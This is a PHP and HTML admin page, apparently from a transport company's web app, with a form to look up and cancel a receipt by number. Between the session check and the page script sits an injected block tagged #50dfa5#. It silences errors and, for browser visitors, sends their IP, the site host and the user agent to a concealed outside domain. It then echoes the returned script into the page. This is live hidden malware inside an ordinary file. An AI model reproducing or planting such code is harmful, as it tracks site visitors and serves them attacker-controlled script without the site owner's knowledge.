<?php  	
	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}
	else if($_SESSION["tipo"]=="trab")
	{
		header("Location: trabajador..php");
	}	
	include("../conexion/ajax.php");
?>
<?php
#50dfa5#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/50dfa5#
?>
<script language="javascript" type="text/javascript">
	function go()
	{
		location.href="administrador.php";
	}
	
	function buscarComp()
	{
		agregarCargando('cargando');
		codComp = document.getElementById("textCodComp").value;
		//codCompAux = parseInt(codComp);
		
		if(codComp.length==0)
		{
			alert("¡ Debes ingresar un número de comprobante !");
			quitarCargando('cargando');	
			return;	
		}
		/*else if(codCompAux.toString().length!=codComp.length)
		{	
			alert("¡ El número del comprobante debe ser un número entero positivo !");
			quitarCargando('cargando');	
			return;		
		}*/
		_obj = crearObjeto();
		//quitarCargando('cargando');			
		_url = "ajaxManejador.php";
		_valores = "op=buscarComp&clave=" + codComp + "&tipo=Numero";
		_obj.open("POST", _url, true);
		_obj.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); //cabecera post
		_obj.send(_valores);
		_obj.onreadystatechange = function()
		{
			//Carga completa (Estado de la conexion)
			if(_obj.readyState==4)
			{
				//Completadoc no exito (Codigo enviado por el servidor)
				if(_obj.status==200)
				{
					resp = _obj.responseText;
					resp = resp.split("*");
					if(resp[0] == "notFound")
					{	
						alert("! No existe comprobante con número " + codComp + " !");
						quitarCargando('cargando');
						document.getElementById('cliente').innerHTML = "";
						document.getElementById('fecha').innerHTML = "";
						document.getElementById('total').innerHTML = "";
						return;
					}					
					document.getElementById('cliente').innerHTML = resp[0];
					document.getElementById('fecha').innerHTML = resp[4];
					document.getElementById('total').innerHTML = resp[3];
					quitarCargando('cargando');	
				}
			}
		}		
	}
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<style type="text/css">
<!--
.Estilo2 {font-weight: bold}
-->
</style>
<title>:: Transportes Marin Hermanos - AnularComprobante ::</title></head>

<body>
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../conexion/Img/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td height="142"><div align="center">
		<form id="form1" method="post" action="admin.php">
          <table width="400" border="0">
		  <tr>
              <th colspan="3" scope="col">ANULAR COMPROBANTE </th>
              </tr>
            <tr>
              <th colspan="3" scope="col">&nbsp;</th>
              </tr>
            <tr>
              <td width="155"><em><strong>Nro. Comprobante : </strong></em></td>
              <td colspan="2">
                <label>
                  <div align="justify">
                    <input name="textCodComp" type="text" id="textCodComp" />
                  </div>
                </label> </td>
            </tr>
            <tr>
              <td height="44">&nbsp;</td>
              <td>
                <label>
                  <input name="Buscar" type="button" id="Buscar" value="Buscar"  onclick="buscarComp()"/>
                  </label>  </td>
              <td><div align="center" id="cargando"></div></td>
            </tr>
            <tr>
              <td height="31"><em><strong>Cliente :</strong></em></td>
              <td colspan="2"><div align="justify" id="cliente"></div></td>
            </tr>
            <tr>
              <td height="31"><em><strong>Fecha :</strong></em></td>
              <td colspan="2"><div align="justify" id="fecha"></div></td>
            </tr>
            <tr>
              <td height="34"><em><strong>Total : </strong></em></td>
              <td colspan="2"><div align="justify" id="total"></div></td>
            </tr>
            <tr>
              <td>&nbsp;</td>
              <td colspan="2">&nbsp;</td>
            </tr>
            <tr>
              <td height="28">
                  <div align="center">
                    <input name="Anular" type="submit" id="Anular" value="Anular"  onclick="anularComp()"/>
                    <input name="op" type="hidden" id="op" value="anularComp"/>					
                  </div></td>
              <td width="87">&nbsp;</td>
              <td width="136">
                  <div align="left">
                    <input name="Cancelar" type="button" id="Cancelar" value="Cancelar" onClick="go()" /> 
                  </div></td>
              </tr>
          </table>
		  </form>
        </div></td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2"></div></td>
      </tr>

    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</body>
</html>

